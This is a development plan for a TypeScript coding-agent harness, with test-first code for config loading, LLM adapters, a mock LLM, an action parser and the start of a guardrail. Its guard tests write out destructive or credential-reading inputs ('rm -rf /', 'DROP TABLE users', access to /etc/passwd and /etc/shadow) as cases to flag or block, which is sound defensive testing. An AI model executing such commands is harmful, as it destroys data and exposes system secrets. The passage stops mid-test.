# Coding Agent Harness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a TypeScript/Node.js Coding Agent Harness with event-driven pipeline architecture, mock-LLM-testable mechanisms, and a deep focus on memory/context engineering.

**Architecture:** Event-driven pipeline -- ContextAssembler -> LLM -> Parser -> Guard -> Executor -> Feedback -> loop. Memory layer (L1/L2/L3) as a side channel. Multi-provider LLM abstraction. Deterministic guardrail and feedback mechanisms.

**Tech Stack:** TypeScript, Node.js 20+, better-sqlite3, commander, chalk, keytar, vitest, fetch (native HTTP)

## Global Constraints

- Language: TypeScript (strict mode)
- Runtime: Node.js 20+ (LTS)
- Test framework: Vitest (compatible with Jest API)
- LLM calling: Direct HTTP fetch (no vendor SDK)
- Database: better-sqlite3 (synchronous API)
- Credential storage: keytar (system keychain) with .env fallback
- CLI framework: commander
- All core mechanisms must be testable with mock/stub LLM (no network, no real LLM)
- No placeholders, TBD, or TODO in implementation
- TDD: every task writes failing test first, then implementation
- Each task ends with a commit

---

## Task Dependency Graph

```
Task 1 (scaffolding)
  +-- Task 2 (shared types + config)
  |     +-- Task 3 (LLM types)
  |     |     +-- Task 4 (mock LLM)
  |     |     +-- Task 5 (LLM adapters) -- Task 6 (factory)
  |     +-- Task 7 (parser)
  |     +-- Task 8 (guard)
  |     +-- Task 9 (tool types + registry + tools)
  |     |     +-- Task 11 (executor)
  |     +-- Task 10 (memory: L1 + L2 store)
  |           +-- Task 13 (L2 retriever)
  |           +-- Task 14 (context-injector + compressor)
  +-- Task 12 (feedback) -- depends on Task 2 types
  +-- Task 15 (main loop) -- depends on Task 4,6,7,8,11,12,14
  +-- Task 16 (CLI) -- depends on Task 15
  +-- Task 17 (L3 memory) -- depends on Task 10 types
  +-- Task 18 (MemoryManager) -- depends on Task 10,13,14,17
  +-- Task 19 (credentials) -- independent
  +-- Task 20 (demos) -- depends on Task 15,18
  +-- Task 21 (Docker + CI) -- depends on Task 16
  +-- Task 22 (README) -- last
```

**Parallelizable groups:**
- Tasks 4,5,7,8,9,10 can run in parallel (after Task 3)
- Tasks 12,13,14,19 can run in parallel (after their deps)
- Tasks 17,18 can be deferred until after core loop works

---
### Task 1: Project Scaffolding

**Files:**
- Create: `package.json`, `tsconfig.json`, `vitest.config.ts`, `.gitignore`, `src/index.ts`

**Interfaces:**
- Produces: `package.json` with all dependencies declared, `tsconfig.json` with strict mode, `vitest.config.ts` ready for testing

- [ ] **Step 1: Initialize git repo**

```bash
git init
```

- [ ] **Step 2: Create package.json**

```json
{
  "name": "coding-agent-harness",
  "version": "1.0.0",
  "description": "A Coding Agent Harness that enables AI to autonomously modify code, run tests, and self-correct",
  "main": "dist/index.js",
  "bin": { "harness": "./dist/index.js" },
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest",
    "demo:guard": "npx tsx demos/guard-demo.ts",
    "demo:feedback": "npx tsx demos/feedback-demo.ts",
    "demo:memory": "npx tsx demos/memory-demo.ts"
  },
  "dependencies": {
    "better-sqlite3": "^11.0.0",
    "chalk": "^5.3.0",
    "commander": "^12.0.0",
    "keytar": "^7.9.0"
  },
  "devDependencies": {
    "@types/better-sqlite3": "^7.6.8",
    "@types/node": "^20.0.0",
    "typescript": "^5.4.0",
    "vitest": "^1.6.0",
    "tsx": "^4.7.0"
  }
}
```

- [ ] **Step 3: Create tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "lib": ["ES2022"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": true,
    "sourceMap": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist", "tests", "demos"]
}
```

- [ ] **Step 4: Create vitest.config.ts**

```typescript
import { defineConfig } from 'vitest/config';
export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
    include: ['tests/**/*.test.ts'],
    testTimeout: 10000,
  },
});
```

- [ ] **Step 5: Create .gitignore**

```
node_modules/
dist/
.harness/
.env
*.db
*.db-journal
```

- [ ] **Step 6: Create placeholder src/index.ts**

```typescript
#!/usr/bin/env node
console.log('Coding Agent Harness');
```

- [ ] **Step 7: Install dependencies and verify**

```bash
npm install
```

- [ ] **Step 8: Run build to verify**

```bash
npm run build
```
Expected: compiles without errors, `dist/index.js` created.

- [ ] **Step 9: Run tests to verify vitest works**

```bash
npm test
```
Expected: "No test files found" or passes.

- [ ] **Step 10: Commit**

```bash
git add .
git commit -m "chore: scaffold project with TypeScript, Vitest, dependencies"
```

---

### Task 2: Shared Types and Config Loader

**Files:**
- Create: `src/types.ts`, `src/config/types.ts`, `src/config/loader.ts`
- Test: `tests/config/loader.test.ts`

**Interfaces:**
- Produces: `Action`, `ToolResult`, `Message`, `ToolCall`, `LoopResult` types; `Config` interface; `loadConfig(cwd?: string): Config` function

- [ ] **Step 1: Write failing test**

Create `tests/config/loader.test.ts`:

```typescript
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { writeFileSync, mkdirSync, rmSync } from 'fs';
import { join } from 'path';
import { loadConfig } from '../../src/config/loader';

const TEST_DIR = join(__dirname, '..', '..', '.test-config');

describe('loadConfig', () => {
  beforeEach(() => {
    rmSync(TEST_DIR, { recursive: true, force: true });
    mkdirSync(TEST_DIR, { recursive: true });
  });
  afterEach(() => {
    rmSync(TEST_DIR, { recursive: true, force: true });
  });

  it('should return defaults when no config file exists', () => {
    const config = loadConfig(TEST_DIR);
    expect(config.llm.provider).toBe('openai');
    expect(config.llm.maxTokens).toBe(4096);
    expect(config.loop.maxIterations).toBe(50);
    expect(config.memory.workingMemoryRounds).toBe(10);
  });

  it('should load and merge project config', () => {
    writeFileSync(join(TEST_DIR, '.harnessrc.json'), JSON.stringify({
      llm: { provider: 'mock', maxTokens: 2048 },
      loop: { maxIterations: 10 },
    }));
    const config = loadConfig(TEST_DIR);
    expect(config.llm.provider).toBe('mock');
    expect(config.llm.maxTokens).toBe(2048);
    expect(config.loop.maxIterations).toBe(10);
    expect(config.memory.workingMemoryRounds).toBe(10);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/config/loader.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/types.ts**

```typescript
export interface Action {
  type: 'tool_call' | 'stop' | 'invalid';
  tool?: string;
  args?: Record<string, unknown>;
  reason?: string;
}

export interface ToolResult {
  tool: string;
  stdout: string;
  stderr: string;
  exitCode: number;
  success: boolean;
}

export interface Message {
  role: 'system' | 'user' | 'assistant' | 'tool';
  content: string | null;
  toolCallId?: string;
  name?: string;
  toolCalls?: ToolCall[];
}

export interface ToolCall {
  id: string;
  type: 'function';
  function: { name: string; arguments: string };
}

export interface LoopResult {
  success: boolean;
  reason: string;
  iterations: number;
}
```

- [ ] **Step 4: Create src/config/types.ts**

```typescript
export interface Config {
  llm: LLMConfig;
  loop: LoopConfig;
  tools: ToolsConfig;
  memory: MemoryConfig;
}

export interface LLMConfig {
  provider: 'openai' | 'anthropic' | 'openai-compat' | 'mock';
  model: string;
  maxTokens: number;
  temperature: number;
  baseUrl?: string;
}

export interface LoopConfig {
  maxIterations: number;
  maxContextTokens: number;
  maxConsecutiveFailures: number;
}

export interface ToolsConfig {
  workspaceRoot: string;
  allowedCommands: string[];
  blockedPatterns: string[];
}

export interface MemoryConfig {
  sessionDbPath: string;
  projectDbPath: string;
  workingMemoryRounds: number;
  sessionMemoryExpireDays: number;
  retrievalTopK: number;
}

export const DEFAULT_CONFIG: Config = {
  llm: { provider: 'openai', model: 'gpt-4o', maxTokens: 4096, temperature: 0.1 },
  loop: { maxIterations: 50, maxContextTokens: 128000, maxConsecutiveFailures: 3 },
  tools: { workspaceRoot: process.cwd(), allowedCommands: [], blockedPatterns: [] },
  memory: { sessionDbPath: '.harness/session.db', projectDbPath: '.harness/project.db', workingMemoryRounds: 10, sessionMemoryExpireDays: 30, retrievalTopK: 5 },
};
```

- [ ] **Step 5: Create src/config/loader.ts**

```typescript
import { readFileSync, existsSync } from 'fs';
import { join } from 'path';
import { homedir } from 'os';
import { Config, DEFAULT_CONFIG } from './types';

export function loadConfig(cwd?: string): Config {
  const workDir = cwd || process.cwd();
  const config = deepClone(DEFAULT_CONFIG);
  const paths = [join(homedir(), '.harnessrc.json'), join(workDir, '.harnessrc.json')];
  for (const path of paths) {
    if (existsSync(path)) {
      try {
        const raw = readFileSync(path, 'utf-8');
        const partial = JSON.parse(raw) as Partial<Config>;
        deepMerge(config as unknown as Record<string, unknown>, partial as unknown as Record<string, unknown>);
      } catch { /* ignore malformed config */ }
    }
  }
  return config;
}

function deepClone<T>(obj: T): T {
  return JSON.parse(JSON.stringify(obj));
}

function deepMerge(target: Record<string, unknown>, source: Record<string, unknown>): void {
  for (const key of Object.keys(source)) {
    const sv = source[key];
    const tv = target[key];
    if (sv !== null && typeof sv === 'object' && !Array.isArray(sv) && tv !== null && typeof tv === 'object' && !Array.isArray(tv)) {
      deepMerge(tv as Record<string, unknown>, sv as Record<string, unknown>);
    } else {
      target[key] = sv;
    }
  }
}
```

- [ ] **Step 6: Run tests to verify pass**

```bash
npx vitest run tests/config/loader.test.ts
```
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add src/types.ts src/config/types.ts src/config/loader.ts tests/config/loader.test.ts
git commit -m "feat: add shared types and config loader with defaults"
```


### Task 3: LLM Abstraction Types

**Files:**
- Create: `src/core/llm/types.ts`
- Test: `tests/core/llm/types.test.ts`

**Interfaces:**
- Produces: `LLMProvider`, `ChatRequest`, `ChatResponse`, `ToolDefinition` interfaces

- [ ] **Step 1: Write failing test**

Create `tests/core/llm/types.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';

describe('LLM types', () => {
  it('should export LLMProvider interface (compile-time check)', () => {
    const mod = require('../../../src/core/llm/types');
    expect(mod).toBeDefined();
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/llm/types.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/llm/types.ts**

```typescript
import type { Message, ToolCall } from '../../types';

export interface ToolDefinition {
  type: 'function';
  function: { name: string; description: string; parameters: Record<string, unknown> };
}

export interface ChatRequest {
  messages: Message[];
  tools: ToolDefinition[];
  maxTokens?: number;
  temperature?: number;
}

export interface ChatResponse {
  content: string | null;
  toolCalls: ToolCall[];
  finishReason: 'stop' | 'tool_calls' | 'length';
}

export interface LLMProvider {
  chat(request: ChatRequest): Promise<ChatResponse>;
  supportsToolCalling(): boolean;
}
```

- [ ] **Step 4: Run test to verify pass**

```bash
npx vitest run tests/core/llm/types.test.ts
```
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/llm/types.ts tests/core/llm/types.test.ts
git commit -m "feat: add LLM abstraction types"
```

---

### Task 4: Mock LLM Implementation

**Files:**
- Create: `src/core/llm/mock.ts`
- Test: `tests/core/llm/mock.test.ts`

**Interfaces:**
- Consumes: `LLMProvider`, `ChatRequest`, `ChatResponse` from Task 3
- Produces: `MockLLMProvider` class with script mode and replay mode

- [ ] **Step 1: Write failing test**

Create `tests/core/llm/mock.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { MockLLMProvider } from '../../../src/core/llm/mock';
import type { ChatRequest } from '../../../src/core/llm/types';

const TOOLS = [{ type: 'function' as const, function: { name: 'read_file', description: 'Read', parameters: {} } }];

function req(content: string): ChatRequest {
  return { messages: [{ role: 'user', content }], tools: TOOLS };
}

describe('MockLLMProvider', () => {
  it('should return scripted responses in order', async () => {
    const mock = new MockLLMProvider('script', [
      { inputContains: 'hello', response: { content: 'Hi!', toolCalls: [], finishReason: 'stop' as const } },
      { inputContains: 'test', response: { content: 'Testing', toolCalls: [], finishReason: 'stop' as const } },
    ]);
    const r1 = await mock.chat(req('hello world'));
    expect(r1.content).toBe('Hi!');
    const r2 = await mock.chat(req('run test'));
    expect(r2.content).toBe('Testing');
  });

  it('should return tool_call responses', async () => {
    const mock = new MockLLMProvider('script', [{
      inputContains: 'write',
      response: {
        content: null,
        toolCalls: [{ id: 'call_1', type: 'function' as const, function: { name: 'write_file', arguments: '{"path":"test.ts","content":"code"}' } }],
        finishReason: 'tool_calls' as const,
      },
    }]);
    const r = await mock.chat(req('write a file'));
    expect(r.toolCalls).toHaveLength(1);
    expect(r.toolCalls[0].function.name).toBe('write_file');
  });

  it('should throw when script exhausted', async () => {
    const mock = new MockLLMProvider('script', []);
    await expect(mock.chat(req('hello'))).rejects.toThrow('Mock script exhausted');
  });

  it('should support replay mode', async () => {
    const recorded = [
      { content: 'First', toolCalls: [], finishReason: 'stop' as const },
      { content: 'Second', toolCalls: [], finishReason: 'stop' as const },
    ];
    const mock = new MockLLMProvider('replay', recorded);
    expect((await mock.chat(req('any'))).content).toBe('First');
    expect((await mock.chat(req('any'))).content).toBe('Second');
  });

  it('should throw when no script entry matches', async () => {
    const mock = new MockLLMProvider('script', [
      { inputContains: 'nomatch', response: { content: 'x', toolCalls: [], finishReason: 'stop' as const } },
    ]);
    await expect(mock.chat(req('something else'))).rejects.toThrow('No mock script entry matches');
  });

  it('supportsToolCalling should return true', () => {
    expect(new MockLLMProvider('script', []).supportsToolCalling()).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/llm/mock.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/llm/mock.ts**

```typescript
import type { LLMProvider, ChatRequest, ChatResponse } from './types';

export type MockScriptEntry = { inputContains: string; response: ChatResponse };

export class MockLLMProvider implements LLMProvider {
  private mode: 'script' | 'replay';
  private script: MockScriptEntry[];
  private replayQueue: ChatResponse[];
  private index = 0;

  constructor(mode: 'script' | 'replay', data: MockScriptEntry[] | ChatResponse[]) {
    this.mode = mode;
    if (mode === 'script') { this.script = data as MockScriptEntry[]; this.replayQueue = []; }
    else { this.script = []; this.replayQueue = data as ChatResponse[]; }
  }

  async chat(request: ChatRequest): Promise<ChatResponse> {
    if (this.mode === 'replay') {
      if (this.index >= this.replayQueue.length) throw new Error('Mock replay exhausted');
      return this.replayQueue[this.index++];
    }
    const lastUserMsg = [...request.messages].reverse().find(m => m.role === 'user');
    const userContent = lastUserMsg?.content || '';
    for (const entry of this.script) {
      if (userContent.includes(entry.inputContains)) { this.index++; return entry.response; }
    }
    if (this.index >= this.script.length) throw new Error('Mock script exhausted');
    throw new Error(`No mock script entry matches input: "${userContent}"`);
  }

  supportsToolCalling(): boolean { return true; }
  reset(): void { this.index = 0; }
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/llm/mock.test.ts
```
Expected: 6 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/llm/mock.ts tests/core/llm/mock.test.ts
git commit -m "feat: add MockLLMProvider with script and replay modes"
```


### Task 5: LLM Adapters (OpenAI, Anthropic, OpenAI-compat)

**Files:**
- Create: `src/core/llm/openai.ts`, `src/core/llm/anthropic.ts`, `src/core/llm/openai-compat.ts`
- Test: `tests/core/llm/adapters.test.ts`

**Interfaces:**
- Consumes: `LLMProvider`, `ChatRequest`, `ChatResponse` from Task 3
- Produces: `OpenAIProvider`, `AnthropicProvider`, `OpenAICompatProvider` classes

- [ ] **Step 1: Write failing test**

Create `tests/core/llm/adapters.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { OpenAIProvider } from '../../../src/core/llm/openai';
import { AnthropicProvider } from '../../../src/core/llm/anthropic';
import { OpenAICompatProvider } from '../../../src/core/llm/openai-compat';

describe('LLM Adapters', () => {
  describe('OpenAIProvider', () => {
    it('should construct with apiKey', () => {
      const p = new OpenAIProvider('sk-test', 'gpt-4o');
      expect(p.supportsToolCalling()).toBe(true);
    });
    it('should throw on missing apiKey', () => {
      expect(() => new OpenAIProvider('', 'gpt-4o')).toThrow('API key is required');
    });
  });
  describe('AnthropicProvider', () => {
    it('should construct with apiKey', () => {
      const p = new AnthropicProvider('sk-ant-test', 'claude-sonnet-4-20250514');
      expect(p.supportsToolCalling()).toBe(true);
    });
    it('should throw on missing apiKey', () => {
      expect(() => new AnthropicProvider('', 'claude-sonnet-4-20250514')).toThrow('API key is required');
    });
  });
  describe('OpenAICompatProvider', () => {
    it('should construct with apiKey and baseUrl', () => {
      const p = new OpenAICompatProvider('sk-test', 'deepseek-chat', 'https://api.deepseek.com/v1');
      expect(p.supportsToolCalling()).toBe(true);
    });
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/llm/adapters.test.ts
```
Expected: FAIL -- modules not found.

- [ ] **Step 3: Create src/core/llm/openai.ts**

```typescript
import type { LLMProvider, ChatRequest, ChatResponse } from './types';

export class OpenAIProvider implements LLMProvider {
  private apiKey: string;
  private model: string;
  private baseUrl: string;

  constructor(apiKey: string, model: string = 'gpt-4o', baseUrl?: string) {
    if (!apiKey) throw new Error('OpenAI API key is required');
    this.apiKey = apiKey;
    this.model = model;
    this.baseUrl = baseUrl || 'https://api.openai.com/v1';
  }

  async chat(request: ChatRequest): Promise<ChatResponse> {
    const body = {
      model: this.model,
      messages: request.messages.map(m => ({
        role: m.role, content: m.content,
        ...(m.toolCallId ? { tool_call_id: m.toolCallId } : {}),
        ...(m.name ? { name: m.name } : {}),
        ...(m.toolCalls ? { tool_calls: m.toolCalls } : {}),
      })),
      tools: request.tools.length > 0 ? request.tools : undefined,
      max_tokens: request.maxTokens,
      temperature: request.temperature,
    };

    const response = await fetch(`${this.baseUrl}/chat/completions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.apiKey}` },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const errText = await response.text();
      throw new Error(`OpenAI API error ${response.status}: ${errText}`);
    }

    const data = await response.json() as { choices: Array<{ message: { content: string | null; tool_calls?: Array<{ id: string; type: 'function'; function: { name: string; arguments: string } }> }; finish_reason: string }> };
    const choice = data.choices[0];
    return {
      content: choice.message.content || null,
      toolCalls: choice.message.tool_calls?.map(tc => ({ id: tc.id, type: 'function' as const, function: { name: tc.function.name, arguments: tc.function.arguments } })) || [],
      finishReason: choice.finish_reason === 'tool_calls' ? 'tool_calls' : choice.finish_reason === 'length' ? 'length' : 'stop',
    };
  }

  supportsToolCalling(): boolean { return true; }
}
```

- [ ] **Step 4: Create src/core/llm/anthropic.ts**

```typescript
import type { LLMProvider, ChatRequest, ChatResponse } from './types';

export class AnthropicProvider implements LLMProvider {
  private apiKey: string;
  private model: string;

  constructor(apiKey: string, model: string = 'claude-sonnet-4-20250514') {
    if (!apiKey) throw new Error('Anthropic API key is required');
    this.apiKey = apiKey;
    this.model = model;
  }

  async chat(request: ChatRequest): Promise<ChatResponse> {
    const systemMsg = request.messages.find(m => m.role === 'system');
    const messages = request.messages.filter(m => m.role !== 'system').map(m => ({ role: m.role, content: m.content || '' }));

    const body: Record<string, unknown> = {
      model: this.model,
      max_tokens: request.maxTokens || 4096,
      messages,
      ...(systemMsg ? { system: systemMsg.content } : {}),
      ...(request.tools.length > 0 ? { tools: request.tools.map(t => ({ name: t.function.name, description: t.function.description, input_schema: t.function.parameters })) } : {}),
    };

    const response = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-api-key': this.apiKey, 'anthropic-version': '2023-06-01' },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const errText = await response.text();
      throw new Error(`Anthropic API error ${response.status}: ${errText}`);
    }

    const data = await response.json() as { content: Array<{ type: string; text?: string; id?: string; name?: string; input?: Record<string, unknown> }>; stop_reason: string };
    const textContent = data.content.find(c => c.type === 'text');
    const toolUses = data.content.filter(c => c.type === 'tool_use');
    return {
      content: textContent?.text || null,
      toolCalls: toolUses.map(tu => ({ id: tu.id || '', type: 'function' as const, function: { name: tu.name || '', arguments: JSON.stringify(tu.input || {}) } })),
      finishReason: data.stop_reason === 'tool_use' ? 'tool_calls' : data.stop_reason === 'max_tokens' ? 'length' : 'stop',
    };
  }

  supportsToolCalling(): boolean { return true; }
}
```

- [ ] **Step 5: Create src/core/llm/openai-compat.ts**

```typescript
import { OpenAIProvider } from './openai';

export class OpenAICompatProvider extends OpenAIProvider {
  constructor(apiKey: string, model: string, baseUrl: string) {
    super(apiKey, model, baseUrl);
  }
}
```

- [ ] **Step 6: Run tests to verify pass**

```bash
npx vitest run tests/core/llm/adapters.test.ts
```
Expected: 6 tests PASS.

- [ ] **Step 7: Commit**

```bash
git add src/core/llm/openai.ts src/core/llm/anthropic.ts src/core/llm/openai-compat.ts tests/core/llm/adapters.test.ts
git commit -m "feat: add OpenAI, Anthropic, and OpenAI-compat LLM adapters"
```

---

### Task 6: LLM Provider Factory

**Files:**
- Create: `src/core/llm/factory.ts`
- Test: `tests/core/llm/factory.test.ts`

**Interfaces:**
- Consumes: `LLMProvider` from Task 3; `MockLLMProvider` from Task 4; adapters from Task 5; `Config` from Task 2
- Produces: `createLLMProvider(config: Config, apiKeys: Record<string, string>): LLMProvider`

- [ ] **Step 1: Write failing test**

Create `tests/core/llm/factory.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { createLLMProvider } from '../../../src/core/llm/factory';
import { MockLLMProvider } from '../../../src/core/llm/mock';
import { OpenAIProvider } from '../../../src/core/llm/openai';
import { AnthropicProvider } from '../../../src/core/llm/anthropic';
import { OpenAICompatProvider } from '../../../src/core/llm/openai-compat';
import type { Config } from '../../../src/config/types';

const baseConfig: Config = {
  llm: { provider: 'openai', model: 'gpt-4o', maxTokens: 4096, temperature: 0.1 },
  loop: { maxIterations: 50, maxContextTokens: 128000, maxConsecutiveFailures: 3 },
  tools: { workspaceRoot: '.', allowedCommands: [], blockedPatterns: [] },
  memory: { sessionDbPath: ':memory:', projectDbPath: ':memory:', workingMemoryRounds: 10, sessionMemoryExpireDays: 30, retrievalTopK: 5 },
};

describe('createLLMProvider', () => {
  it('should create MockLLMProvider for mock provider', () => {
    const config = { ...baseConfig, llm: { ...baseConfig.llm, provider: 'mock' as const } };
    const p = createLLMProvider(config, {});
    expect(p).toBeInstanceOf(MockLLMProvider);
  });

  it('should create OpenAIProvider for openai provider', () => {
    const p = createLLMProvider(baseConfig, { openai: 'sk-test' });
    expect(p).toBeInstanceOf(OpenAIProvider);
  });

  it('should create AnthropicProvider for anthropic provider', () => {
    const config = { ...baseConfig, llm: { ...baseConfig.llm, provider: 'anthropic' as const } };
    const p = createLLMProvider(config, { anthropic: 'sk-ant-test' });
    expect(p).toBeInstanceOf(AnthropicProvider);
  });

  it('should create OpenAICompatProvider for openai-compat provider', () => {
    const config = { ...baseConfig, llm: { ...baseConfig.llm, provider: 'openai-compat' as const, baseUrl: 'https://api.example.com/v1' } };
    const p = createLLMProvider(config, { 'openai-compat': 'sk-test' });
    expect(p).toBeInstanceOf(OpenAICompatProvider);
  });

  it('should throw for missing API key', () => {
    expect(() => createLLMProvider(baseConfig, {})).toThrow('API key not found');
  });

  it('should throw for unknown provider', () => {
    const config = { ...baseConfig, llm: { ...baseConfig.llm, provider: 'unknown' as any } };
    expect(() => createLLMProvider(config, {})).toThrow('Unknown LLM provider');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/llm/factory.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/llm/factory.ts**

```typescript
import type { LLMProvider } from './types';
import type { Config } from '../../config/types';
import { MockLLMProvider } from './mock';
import { OpenAIProvider } from './openai';
import { AnthropicProvider } from './anthropic';
import { OpenAICompatProvider } from './openai-compat';

export function createLLMProvider(config: Config, apiKeys: Record<string, string>): LLMProvider {
  const { provider, model, baseUrl } = config.llm;

  switch (provider) {
    case 'mock':
      return new MockLLMProvider('script', []);
    case 'openai': {
      const key = apiKeys['openai'];
      if (!key) throw new Error('OpenAI API key not found');
      return new OpenAIProvider(key, model, baseUrl);
    }
    case 'anthropic': {
      const key = apiKeys['anthropic'];
      if (!key) throw new Error('Anthropic API key not found');
      return new AnthropicProvider(key, model);
    }
    case 'openai-compat': {
      const key = apiKeys['openai-compat'];
      if (!key) throw new Error('OpenAI-compat API key not found');
      if (!baseUrl) throw new Error('baseUrl is required for openai-compat provider');
      return new OpenAICompatProvider(key, model, baseUrl);
    }
    default:
      throw new Error(`Unknown LLM provider: ${provider}`);
  }
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/llm/factory.test.ts
```
Expected: 6 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/llm/factory.ts tests/core/llm/factory.test.ts
git commit -m "feat: add LLM provider factory"
```


### Task 7: Action Parser

**Files:**
- Create: `src/core/parser.ts`
- Test: `tests/core/parser.test.ts`

**Interfaces:**
- Consumes: `Action` from Task 2, `ChatResponse` from Task 3
- Produces: `parseAction(response: ChatResponse): Action`

- [ ] **Step 1: Write failing test**

Create `tests/core/parser.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { parseAction } from '../../src/core/parser';
import type { ChatResponse } from '../../src/core/llm/types';

describe('parseAction', () => {
  it('should parse tool_call response', () => {
    const response: ChatResponse = {
      content: null,
      toolCalls: [{ id: 'call_1', type: 'function', function: { name: 'write_file', arguments: '{"path":"test.ts","content":"hello"}' } }],
      finishReason: 'tool_calls',
    };
    const action = parseAction(response);
    expect(action.type).toBe('tool_call');
    expect(action.tool).toBe('write_file');
    expect(action.args).toEqual({ path: 'test.ts', content: 'hello' });
  });

  it('should parse stop response with content', () => {
    const response: ChatResponse = { content: 'Task complete', toolCalls: [], finishReason: 'stop' };
    const action = parseAction(response);
    expect(action.type).toBe('stop');
    expect(action.reason).toBe('Task complete');
  });

  it('should return invalid for empty response', () => {
    const response: ChatResponse = { content: null, toolCalls: [], finishReason: 'stop' };
    const action = parseAction(response);
    expect(action.type).toBe('invalid');
  });

  it('should handle malformed JSON in tool call arguments', () => {
    const response: ChatResponse = {
      content: null,
      toolCalls: [{ id: 'call_1', type: 'function', function: { name: 'write_file', arguments: 'not json' } }],
      finishReason: 'tool_calls',
    };
    const action = parseAction(response);
    expect(action.type).toBe('invalid');
  });

  it('should parse the first tool call when multiple', () => {
    const response: ChatResponse = {
      content: null,
      toolCalls: [
        { id: 'call_1', type: 'function', function: { name: 'read_file', arguments: '{"path":"a.ts"}' } },
        { id: 'call_2', type: 'function', function: { name: 'write_file', arguments: '{"path":"b.ts","content":"x"}' } },
      ],
      finishReason: 'tool_calls',
    };
    const action = parseAction(response);
    expect(action.type).toBe('tool_call');
    expect(action.tool).toBe('read_file');
  });
});
```

- [ ] **Step 2: Run test to verify failure**

```bash
npx vitest run tests/core/parser.test.ts
```
Expected: FAIL -- module not found.

- [ ] **Step 3: Create src/core/parser.ts**

```typescript
import type { Action } from '../types';
import type { ChatResponse } from './llm/types';

export function parseAction(response: ChatResponse): Action {
  if (response.toolCalls.length > 0) {
    const tc = response.toolCalls[0];
    try {
      const args = JSON.parse(tc.function.arguments);
      return { type: 'tool_call', tool: tc.function.name, args };
    } catch {
      return { type: 'invalid', reason: 'Failed to parse tool call arguments' };
    }
  }

  if (response.content && response.content.trim().length > 0) {
    return { type: 'stop', reason: response.content };
  }

  return { type: 'invalid', reason: 'Empty response' };
}
```

- [ ] **Step 4: Run tests to verify pass**

```bash
npx vitest run tests/core/parser.test.ts
```
Expected: 5 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add src/core/parser.ts tests/core/parser.test.ts
git commit -m "feat: add action parser for LLM responses"
```

---

### Task 8: Guardrail System

**Files:**
- Create: `src/core/guard.ts`
- Test: `tests/core/guard.test.ts`

**Interfaces:**
- Consumes: `Action` from Task 2
- Produces: `GuardResult { blocked: boolean; requiresApproval: boolean; reason?: string }`, `checkGuard(action: Action, workspaceRoot: string): GuardResult`

- [ ] **Step 1: Write failing test**

Create `tests/core/guard.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { checkGuard } from '../../src/core/guard';
import type { Action } from '../../src/types';

describe('checkGuard', () => {
  it('should flag rm -rf / as requiresApproval', () => {
    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'rm -rf /' } };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(false);
    expect(result.requiresApproval).toBe(true);
    expect(result.reason).toContain('rm -rf');
  });

  it('should flag DROP TABLE as requiresApproval', () => {
    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'DROP TABLE users' } };
    const result = checkGuard(action, '/workspace');
    expect(result.requiresApproval).toBe(true);
  });

  it('should block file write outside workspace', () => {
    const action: Action = { type: 'tool_call', tool: 'write_file', args: { filePath: '/etc/passwd' } };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(true);
  });

  it('should block file read outside workspace', () => {
    const action: Action = { type: 'tool_call', tool: 'read_file', args: { filePath: '/etc/shadow' } };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(true);
  });

  it('should allow safe command', () => {
    const action: Action = { type: 'tool_call', tool: 'shell', args: { command: 'npm test' } };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(false);
    expect(result.requiresApproval).toBe(false);
  });

  it('should allow file write inside workspace', () => {
    const action: Action = { type: 'tool_call', tool: 'write_file', args: { filePath: '/workspace/src/test.ts' } };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(false);
  });

  it('should allow non-shell non-file actions', () => {
    const action: Action = { type: 'tool_call', tool: 'run_test', args: {} };
    const result = checkGuard(action, '/workspace');
    expect(result.blocked).toBe(false);
    expect(result.requiresApproval).toBe(false);
